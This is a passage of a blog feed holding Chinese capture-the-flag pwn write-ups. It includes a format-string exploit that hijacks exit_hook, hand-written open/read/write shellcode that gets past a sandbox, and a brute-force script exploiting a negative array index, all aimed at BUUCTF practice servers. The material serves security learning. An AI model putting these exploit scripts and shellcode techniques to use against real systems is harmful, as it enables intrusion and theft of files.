class="comment">#sleep(0.5)</span></span><br><span class="line"><span class="comment">#if是用来判断，0xa3和输入的指针末尾谁大，以来决定谁放在前面</span></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">1</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr-<span class="number">0xa3</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">2</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-hook_addr)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x60</span>)+<span class="string">&#x27;c%13$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-<span class="number">0x60</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">hook_addr=hook_addr+<span class="number">0x2</span></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">1</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr-<span class="number">0xa3</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">2</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-hook_addr)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">payload=<span class="string">&#x27;%13$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x082d</span>)+<span class="string">&#x27;c%23$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">40</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#因为前面填充了40字节的数据，而输入的起始地址为0x601060，加上40，就是rop链的位置（最终确定rop链为0x601088）</span></span><br><span class="line">payload+=rop</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#重新获取一下shell</span></span><br><span class="line">p.sendline(<span class="string">&quot;sh&gt;&amp;2&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220419223111162-935171477.png" alt=""></p><h3 id="本地通了，远程没通，应该去考虑libc的问题">本地通了，远程没通，应该去考虑libc的问题</h3><p>最后本地打通，远程没打通。此时应该意识到可能是libc的问题，而这道题one_gadget又会受到libc的影响。因此应该去考虑下本地patch的libc是否和远程的一样，检查了一下发现，最后的问题出在了libc的小版本不同。最后用buu上的libc去搜索了一下one_gadget，最终成功获取shell。本地当时能成功是因为我patch的一个2.23 libc，又去这个libc里搜了个one_gadget，所以自然是能打通的，但是服务器那边肯定是以它自己的libc为准…</p>]]></content>
      
      
      <categories>
          
          <category> buu刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> one_gadget </tag>
            
            <tag> magic_gadget </tag>
            
            <tag> 格式化字符串漏洞 </tag>
            
            <tag> 劫持exit_hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF_gwctf_2019_shellcode</title>
      <link href="/posts/a3bb0057.html"/>
      <url>/posts/a3bb0057.html</url>
      
        <content type="html"><![CDATA[<h2 id="总结：">总结：</h2><p>通过这道题的学习与收获有：</p><p>1、strlen函数是可以被00给截断的，而shellcode本身执行的时候并不会因为00截断。</p><p>2、第一次手写open,read,write函数的汇编</p><p>3、push一个字符串的话，比如push 0x67616c66 （这个是flag），不足八字节，push的时候会自动填充00补全八字节，从而占满一个内存单元。</p><h2 id="保护策略：">保护策略：</h2><p><img src="../img/2706180-20220405154514758-712380835.png" alt=""></p><p>发现没开NX，那基本就是shellcode没跑了。</p><p>然后发现开启了沙箱，禁用了execve函数，那就考虑写一个orw的shellcode</p><p><img src="../img/2706180-20220405154531094-617647394.png" alt=""></p><h2 id="程序分析：">程序分析：</h2><p><img src="../img/2706180-20220405154542848-1797363016.png" alt=""></p><p>由于这个main函数里面存在一个这个汇编指令，因此不能生成伪代码，那就只能读汇编了，好在程序也不复杂。</p><p><img src="../img/2706180-20220405154553188-189814088.png" alt=""></p><p>逻辑就是执行is_printable之后，去将eax与自身相与，如果eax的值为1，test执行之后的运算结果为1（标志寄存器的值为0,否则反之)如果标志寄存器的值为1，则jz指令进行跳转，跳转到loc_AC1函数，如果触发了该函数则程序直接结束，并不会触发call rax的指令，如果jz不进行跳转，则执行call rax（执行完lea之后，rax的值存放的就是read函数输入进去的内容，因此我们输入的时候直接布置shellcode即可）。</p><h2 id="大致思路：">大致思路：</h2><p>因此我们要触发call rax，就需要让loc_AC1函数的返回值为0。</p><p><img src="../img/2706180-20220405154601824-154673174.png" alt=""></p><p>而这个函数返回值为0的前提就是输入的内容ascii码必须要大于31，并且不能等于127。因为我们构造的shellcode经常会存在不可见字符，因此这里我起初考虑的是将写的shellcode转换成可见字符。</p><p>然后转换成可见字符发现，这个shellcode太长了。（下面是转换成可见字符之后的shellcode）</p><p><img src="../img/2706180-20220405154611925-62685447.png" alt=""></p><p>然后到这里就卡住了，参考了另一篇师傅的博客，发现strlen函数是可以被00截断的（我自己试了一下发现确实如此）</p><p>也就是说只要让shellcode中出现00，并且在00之前的是可见字符就ok了，因为strlen获取的长度就到00这里。</p><p><img src="../img/2706180-20220405154620185-1611603895.png" alt=""></p><p>这个循环就不会再往后跑了，因此它不会对00后面的内容进行检查。在这里要说一下，<strong>shellcode本身执行的话并不会被00截断，因为shellcode本身毕竟就是一堆机器码而已，CPU执行机器码的时候，才不管你什么00截断不截断呢，机器码是什么它就执行什么。真正会因为00而截断shellcode的其实是一些函数,比如strcpy这个函数。</strong></p><p>因此我们只需要让shellcode中尽早的出现00机器码即可</p><p>然后就是开始手动编写shellcode了。</p><h2 id="手写orw-shellcode">手写orw-shellcode</h2><p>首先我们要执行的如下的代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(flag_addr,<span class="number">0</span>)</span><br><span class="line">read(<span class="number">3</span>,addr,<span class="number">0x50</span>)<span class="comment">#第一个参数是3，因为一个进程有默认的文件描述符0,1,2。当再打开新的文件之后，文件描述符就会以此类推的分配，因此上面open新打开的flag文件的文件描述符就是3</span></span><br><span class="line"><span class="comment">#至于这个addr，把读出来的flag放到哪，一会再说</span></span><br><span class="line">write(<span class="number">1</span>,addr,<span class="number">0x50</span>)</span><br></pre></td></tr></table></figure><p>接下来，就开始用汇编来实现上面的内容。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">open(flag_addr,0)</span><br><span class="line">push 0x67616c66</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">#上面这两步就是在传open的第一个参数，这个参数要是一个地址，这个地址要指向字符串&#x27;flag&#x27;</span><br><span class="line">#执行完push 0x67616c66的时候，栈顶的内容就是字符串flag，而栈顶指针rsp就指向了这个flag，此时执行push rsp将指向flag的地址（也就是rsp）压栈，此时栈顶的内容就是那个指向flag的地址，然后再执行pop rdi</span><br><span class="line">#将栈顶的这个内容弹给rdi，此时open的第一个参数就成为了指向flag的地址</span><br><span class="line">push 0#这个push 0这里就会出现机器码00，用来截断strlen函数</span><br><span class="line">pop rsi</span><br><span class="line">push 2</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">read(3,addr,0x50)</span><br><span class="line">push 3</span><br><span class="line">pop rdi</span><br><span class="line">push rsp </span><br><span class="line">pop rsi</span><br><span class="line">#上面这两步在完成read函数的第二个参数传参，此时压入栈的rsp，我并不知道这个地址是什么，只知道把这个地址给rsi的话，flag就会被写到这个地址里面，至于这个地址是什么，真的不重要，重要的是要保证接下来write的第二个参数也是这个地址即可，而我们要做的就是保证接下来的每一个push都要对应一个pop，这样栈顶始终就是给当初rsi的那个地址了。</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 0</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">write(1,addr,0x50)</span><br><span class="line">push 1</span><br><span class="line">pop rdi</span><br><span class="line">push rsp</span><br><span class="line">pop rsi</span><br><span class="line">#这个地方的push rsp pop rsi原理同上</span><br><span class="line">push 0x50</span><br><span class="line">pop rdx</span><br><span class="line">push 1</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="EXP：">EXP：</h2><p>最后脚本的话有一点要注意一下。</p><p><img src="../img/2706180-20220405154632624-1550577273.png" alt=""></p><p>这个地方有一个指令，它将把我们输入的payload的最后一字节改成0。（如下图）</p><p><img src="../img/2706180-20220405154644353-718454188.png" alt=""><br><img src="../img/2706180-20220405154653289-1949378506.png" alt=""></p><p>这样的后果就是将我们的shellcode最后一个syscall给破坏了，因此我们在syscall后面随便再写个指令，syscall就是完整的了。</p><p>最后exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28435</span>)</span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push 2</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 3</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push 1</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">p.send(shellcode)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220405154703410-2032422839.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> buu刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 沙箱逃逸 </tag>
            
            <tag> orw </tag>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF_jarvisoj_guess</title>
      <link href="/posts/992e244b.html"/>
      <url>/posts/992e244b.html</url>
      
        <content type="html"><![CDATA[<h1>总结：</h1><p>通过这道题的学习与收获有：（说实话，我把这玩意拖到IDA里的一刻，我是想直接把它扔进回收站的，不过最终还是硬着头皮做下来了，收获也真的很多）</p><p>1、这道题的漏洞点是数组下标的不检查，导致char类型可能自身变成负数，使得我们可以输入不正常数据来通过对flag的检查。</p><p>2、使用单字节爆破的手段，获取flag，这道题对于flag的检查是判断整体的，但之所以可以进行单字节爆破是因为我们是先通过了flag的检查，然后依次改变一字节，来观察回显，我们的flag是否正确，从而进行单字节的爆破。并且还有一个前提是不限次数的输入内容（只要内容是100字节，就可以与flag进行比较判断）</p><p>3、当时关于本机的flag和远程的flag这里迷了好久，我一直以为本机的是假flag，然后远程是通过某种加密手段放的是真flag（意思就是说本机flag和远程flag我感觉应该是有关系的），最后看了下前面的英文提示，又想了很久最后发现，这俩flag之间并没有任何关系…</p><p>4、我们始终都没法直接控制value_1和value_2的值，我们仅仅只能去控制bin_by_hex数组的索引，而我们爆破的其实是bin_by_hex数组的下标，而真正的flag是通过这个下标去数组bin_by_hex里面找到真正flag的所对应的字符。之所以给我们一种爆破flag的错觉其实是因为爆破的bin_by_hex数组下标正好又是对应字符的ascii（比如我爆破b的时候，分别发了6和2，这个0x62其实是bin_by_hex的下标，但是这个下标放的又正好是b）因此就感觉我们在爆破flag一样。关于这个bin_by_hex数组与它的下标这里，我迷了很久。</p><p>5、这道题最后的爆破脚本我感觉还是需要一些python功底才能写出来的（我是看了下师傅们的 exp才写出来的）</p><p>6、这道题最恶心的地方就是调试很麻烦（其实我压根就不会…），而且对于这道题调试而言的话，也不知道调试该看什么，又是要连接的，又是fork的，确实不会调…</p><p>7、熟悉了一下常见网络编程函数的功能，用IDA简单对他们进行了流程的分析。</p><h1>保护策略：</h1><p><img src="../img/2706180-20220407213934511-1318458791.png" alt=""></p><h1>程序分析：</h1><h2 id="关于socket网络编程的内容分析">关于socket网络编程的内容分析</h2><p>由于一打开程序看到的就是socket网络编程的那些函数，不过这些都和这道题没有关系，<strong>关于这些函数我将放在文章的最后分析，下面直接开始上正片。</strong></p><h2 id="重要的英文提示">重要的英文提示</h2><p>这个程序的入手点，其实是人家给出来的提示。</p><p><img src="../img/2706180-20220407213941932-45079530.png" alt=""></p><p>上面这四行话很关键，要是不注意的话，其实是很难理解这道题目。</p><p>大概意思就是说，现在你本地的这个程序是一个测试程序，在这个测试程序里面的flag，是以FAKE{开始的，其实你可以发现，<strong>本机上的flag，ida打开之后就直接看见了</strong>。也就是说这道题本机上的flag你是可以看见的，但是第四行说了，<strong>具有real flag的程序是运行在服务器那边的</strong>，它是以PCTF{开头的，并且是50个字符  （但是这道题我是从BUUCTF上做的，因此buu上服务器那边的flag依然是以flag{开头的）</p><p>一句话总结就是，<strong>本机上的flag你能看见，服务器那边运行的这个程序同样的位置也有一个flag（和你本机上的flag不一样）你看不见，但是你要想办法知道它。</strong></p><h2 id="一个奇怪的负数索引">一个奇怪的负数索引</h2><p><img src="../img/2706180-20220407213951129-1415363463.png" alt=""></p><p>可以发现整个程序的漏洞点在这个函数里。</p><p><img src="../img/2706180-20220407214000770-1049221226.png" alt=""></p><p>首先看这个地方，数组里面的下标索引值又是一个数组，这个地方应该是很容易出现问题的，再仔细分析一下，数组里面的那个数组（其实也不是数组，只是个以索引方式来检索的一个char指针），这个东西是个char类型的，char类型的怎么可以作为下标呢。</p><p><strong>char类型的值强转为int类型之后，超过127的话，则会变成负数</strong></p><p>写个脚本验证一下</p><p><img src="../img/2706180-20220407214009412-961119144.png" alt=""></p><p>因为我们可以控制flag_hex的值，而这个值我们还可以让他可正可负，因此可以利用这个点，去让value_1和value_2得到一些不正常的数据，这个点放在这里，继续往下分析。</p><h2 id="分析合并v1和v2以及检查部分">分析合并v1和v2以及检查部分</h2><p><img src="../img/2706180-20220407214015621-1417489823.png" alt=""></p><p>这个地方，其实我自己没看明白，不过我又写了个c的程序，模拟了一下。</p><p><img src="../img/2706180-20220407214021566-2083393784.png" alt=""></p><p>这回比较清晰了，value_1和value_2会合成一个十六进制的字符(en…上面的value_a就是我说的value_1，当时这里打错了），其中value_1是高位，value_2是低位。</p><p>然后就是flag[i_0]与given_flag[i_0]去异或比较，必须二者使用相同，最后的diff才是0，否则diff不是0（因为有个|，只要一次不是0，之后自己再和自己|的话，就永远都变不会0了）</p><p>而flag[i_0]里面装的就是flag（本机的话，你是可以直接看见的…，但是远程那边的flag你是看不见的，它被复制到了flag[i_0]里面）</p><p>而given_flag[i_0]则很有意思，它是前面两个value_1和value_2拼成的一个字符（拼成的是个十六进制数字然后对应其ASCII码）</p><h2 id="利用负数索引">利用负数索引</h2><p>而value_1和value_2的值则是从bin_by_hex是数组里面靠索引来获取的。下面是bin_by_hex里面的内容（未截全）</p><p><img src="../img/2706180-20220407214029281-12184470.png" alt=""></p><p>这是？？？似乎感觉有点离谱，但是别忘了，我们上面提到了这个索引也可以取负数，因此看一下栈里的情况（上图原本是数据是在data段，但是这串数据被qmemcpy函数拷贝到了栈里，而依靠索引来找数据是在栈中实现的）<br><img src="../img/2706180-20220407214036994-1443796803.png" alt=""></p><p>发现了flag（flag也被qmemcpy函数拷贝到了栈中），居然就在bin_by_hex的上面而且距离仅仅只有0x40个字节。那我们通过负数的索引岂不是就可以很顺利的将given_flag[i_0]设置为flag。我们将value_1去设置为0（因为它乘了个16，不太好控制，把它设置为0之后，只需要控制一个value_2即可），让value_2去为flag的字符即可。<strong>不过我们最终爆破真的flag的时候，是需要分别控制value_1和value_2</strong></p><h2 id="关于将value-1设置为0这件事">关于将value_1设置为0这件事</h2><p>因为我们最后发送的肯定是字符0，对应的ASCII码应该是0x30（因为char类型被作为数组下标的时候，会被自动转换成int类型），因此去bin_by_hex里面找一下0x30的索引。</p><p><img src="../img/2706180-20220407214046292-2046277629.png" alt=""></p><p>发现是0（这个0可是int类型的），因此在given_flag[i] = value2 | (16 * value1);这步的时候，given_flag[i]的值就完全取决于value_2了</p><h1>大致思路：</h1><h2 id="计算负数索引">计算负数索引</h2><p>我们来尝试一下这件事情，首先我们输入的内容一定要让其值为负数（因为我们需要这个负数索引），而这个负数的索引应该是要从-64开始逐渐减小（因为这个索引取得的内容距离bin_by_hex是越来越近的）</p><p><img src="../img/2706180-20220407214054522-409297233.png" alt=""></p><p>再次运行一下c写的程序，发现只要我们输入192，char被作为索引时，会自动转换成int类型，而值为-64.依次类推，我们需要50个这样的索引，因为flag是50个字符。</p><p>我们用python脚本来实现一下这件事。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29002</span>)</span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">192</span>,<span class="number">192</span>+<span class="number">50</span>):</span><br><span class="line">    payload+=<span class="string">&#x27;0&#x27;</span>+<span class="built_in">chr</span>(i)<span class="comment">#第一次输入字符0，让value_1的值为0</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;guess&gt; &#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后…</p><p><img src="../img/2706180-20220407214108228-1548324711.png" alt=""></p><p>它提示你输入对了flag，<strong>但是事实上我们压根输入的就不是flag</strong>，只不过是通过输入一些非正常的数据，<strong>产生了一个负数索引，然后利用这个索引去找到了flag，从而通过了检查</strong>，<strong>而我们是不知道flag的</strong>。</p><h2 id="凭借伪造的flag实现单字节爆破">凭借伪造的flag实现单字节爆破</h2><p>不过好消息是，<strong>我们可以一直输入，只要我们输入的是一百个字节的内容</strong>（因为程序对输入的长度是否是100字节进行了检查），程序就可以告诉我们输入的内容是正确还是错误。这个程序会将我们输入的内容作为一个整体去与flag进行判断，本来这种题目是无法单字节爆破的，<strong>但是我们现在可以靠伪造一个flag去通过检查了，同时我们还可以继续输入内容，让程序判断输入的flag对不对，那我们只需要去每次改变一个字节，如果程序提示Yaaaay!，则说明我们爆破的这个字节是正确的，那就换下一个字节爆破，如果没有提示Yaaaay! 那就换个字符继续爆破这个字节。直到将所有的flag全部爆破出来</strong>。</p><h2 id="EXP：">EXP：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29002</span>)</span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">192</span>,<span class="number">192</span>+<span class="number">50</span>):</span><br><span class="line">    payload+=<span class="string">&#x27;0&#x27;</span>+<span class="built_in">chr</span>(i)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;guess&gt; &#x27;</span>)</span><br><span class="line"><span class="comment">#p.sendline(payload)#当用这部分内容让检查通过时，应该把这一部分注释掉，如果没有注释掉的话，会导致下面发送的内容，第一次的循环修改了内容之后，也通过了检查，因为recvline收到的是，这个payload的Yaaaay!，从而导致下面的检查判断是从第二字节开始，然后就陷入了死循环（因为第一个字节就是错的，即使第二字节爆破出来了，也不会显示Yaaaay!）</span></span><br><span class="line"><span class="comment">#这个解释是我通过观察debug的回显信息分析出来的，不能保证百分百对，不过目前我认为是这样。</span></span><br><span class="line"></span><br><span class="line"><span class="type">List</span> = [<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#这里的话，自己建个列表或者用string,printable效果是一样的，这个无所谓</span></span><br><span class="line">kkk=<span class="built_in">list</span>(payload)</span><br><span class="line">flag=<span class="string">&quot;&quot;</span><span class="comment">#新建一个空的flag字符串，一会爆破出来真的flag将放入这个里面</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="comment">#for x in string.printable:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="type">List</span>:</span><br><span class="line">        kkk[<span class="number">2</span>*i]=<span class="built_in">hex</span>(<span class="built_in">ord</span>(x))[<span class="number">2</span>]<span class="comment">#这个地方是从列表中取一个x，然后将其转换成16进制，用切片取低位</span></span><br><span class="line">        <span class="comment">#print(&quot;kkk[2*i])==&quot;+kkk[2*i])</span></span><br><span class="line">        kkk[<span class="number">2</span>*i+<span class="number">1</span>]=<span class="built_in">hex</span>(<span class="built_in">ord</span>(x))[<span class="number">3</span>]<span class="comment">#用切片取高位 舍弃前面的0x</span></span><br><span class="line">        <span class="comment">#print(&quot;kkk[2*i+1])==&quot;+kkk[2*i+1])</span></span><br><span class="line">        p.sendline(<span class="string">&quot;&quot;</span>.join(kkk))<span class="comment">#将列表kkk添加到字符串里面</span></span><br><span class="line">        re=p.recvline()<span class="comment">#去接收一行的信息</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Yaaaay!&#x27;</span> <span class="keyword">in</span> re:<span class="comment">#判断Yaaaay!是否在这一行出现</span></span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220407214116303-424917594.png" alt=""></p><h1>关于前面的网络编程的内容分析</h1><p>作为大一小萌新，这个学期才刚刚开了计网，嗯…不知道关于这些网络编程在计网课程的后期会不会讲，这里提前学习一下。</p><h2 id="socket函数">socket函数</h2><p><img src="../img/2706180-20220407214123071-334626558.png" alt=""></p><p>这玩意参数2,1,0就分别代表着 ipv6类型，面向连接的套接字，使用TCP传输协议    然后这个socket函数就是创建了个套接字，你要是不理解啥是套接字，你就把它当成一个文件（linux下万物皆文件），然后返回一个文件描述符（也就是新创建的这个套接字）</p><h2 id="bind函数">bind函数</h2><p>下面这个bind函数就很好理解了，就是将IP地址和端口与刚才创建的套接字进行绑定，你可能会问，这参数里面也没传IP地址和端口呀，其实IP地址和端口都在sockaddr这个结构体(在这里面这个结构体就是bind_addr)里面，而你又将这个结构体的地址当做参数传给了bind函数。因此其实bind函数是知道IP地址和端口的。</p><p>它的第一个参数就是刚才创建的套接字的文件描述符，第二个参数是bind_addr结构体的地址，第三个参数是bind_addr结构体的大小（这个是定死的）。</p><p><img src="../img/2706180-20220407214132705-992557442.png" alt=""></p><p>值得一提的就是这个结构体</p><p><img src="../img/2706180-20220407214140416-1386925968.png" alt=""></p><p>最后的sin_port成员，被赋值成了0x270F，也就是端口为9999。</p><h2 id="listen函数">listen函数</h2><p><img src="../img/2706180-20220407214146821-761715580.png" alt=""></p><p>这个参数更简单了，第一个依然是创建套接字的文件描述符，第二个参数是连接请求队列的长度。</p><p>这个函数的意思就是说，让刚才创建的套接字变成被动连接，让当下的这个进程可以接收其他进程的请求，就有点服务器的那种样子嗷。</p><h2 id="accept函数">accept函数</h2><p>这个函数的意思就是创立一个新的文件描述符（你能看见它的返回值是一个新的文件描述符），这个新的文件描述符其实就是一个连接通道，接下来发送和接收的数据都将通过这个连接通道。而原本的那个文件描述符依然在监听port。</p><p><img src="../img/2706180-20220407214156300-296069646.png" alt=""></p><p>我在网上发现这个图片说的很好，搬一下 <a href="%5Bhttps://blog.csdn.net/BengDouLove/article/details/105695351?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-1.pc_relevant_default&amp;utm_relevant_index=1%5D(https://blog.csdn.net/BengDouLove/article/details/105695351?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1.pc_relevant_default&amp;utm_relevant_index=1)">图片出自这里</a></p><p><img src="../img/2706180-20220407214205153-1642587681.png" alt=""></p><p>这张是socket模型图，来源同上</p><p><img src="../img/2706180-20220407214212839-1585808268.png" alt=""></p><p>然后这个地方就在说，fork了一个子进程，如果fork成功的话，就把最开始创建的那个套接字给关了，然后去处理新开的这个套接字。</p><p><img src="../img/2706180-20220407214219138-2084667837.png" alt=""><br><img src="../img/2706180-20220407214226924-1102558480.png" alt=""></p><p>这里就是说把标准输入和标准输出重定向到这个新开的套接字上。</p><h2 id="这几个函数干了啥？">这几个函数干了啥？</h2><p>整体下来的话，也并不复杂，就是在说开了一个程序自身9999的端口，等待着你连接，如果连接上来的话就开启一个新的进程，然后开始对这个新的进程操作。</p><p>在本地运行的话，也是可以看见，程序自己打开了9999端口</p><p><img src="../img/2706180-20220407214235471-1305358205.png" alt=""></p><h1>最后想强调的一点</h1><p>这里已经在开始的总结里说过了，不过依然想强调一下，我们是始终都没法直接控制value_1和value_2的值，我们仅仅只能去控制bin_by_hex数组的索引，而我们爆破的其实是bin_by_hex数组的下标，而真正的flag是通过这个下标去数组bin_by_hex里面找到真正flag的所对应的字符。之所以给我们一种爆破flag的错觉其实是因为爆破的bin_by_hex数组下标正好又是对应字符的ascii（比如我爆破b的时候，分别发了6和2，这个0x62其实是bin_by_hex的下标，但是这个下标放的又正好是b）因此就感觉我们在爆破flag一样。</p>]]></content>
      
      
      <categories>
          
          <category> buu刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爆破 </tag>
            
            <tag> 数组索引无检查 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF_鹏城杯_2018_treasure</title>
      <link href="/posts/7bda138.html"/>
